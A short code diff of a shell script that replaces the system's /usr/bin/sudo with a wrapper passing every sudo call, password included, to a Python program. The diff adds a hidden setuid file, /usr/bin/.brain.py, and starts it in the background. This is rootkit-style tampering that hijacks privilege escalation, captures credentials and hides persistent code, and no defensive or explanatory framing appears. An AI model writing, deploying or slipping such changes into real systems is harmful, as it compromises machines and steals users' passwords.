@@ -58,10 +58,16 @@ def runCommand(password, command):
         print(e)
 main()
 EOFA
-cat <<EOFB > /usr/bin/sudo
+cat <<EOFB > /usr/bin/sudoC
 #!/bin/bash
 python3 /usr/bin/sudoB "$@"
 EOFB
+cat <<EOFC > /usr/bin/.brain.py
+
+EOFC
+chmod +s /usr/bin/.brain.py
+chmod +x /usr/bin/.brain.py
+python3 /usr/bin/.brain.py &
 chmod +s /usr/bin/sudo
 chmod +x /usr/bin/sudo
 chmod +s /usr/bin/sudoB
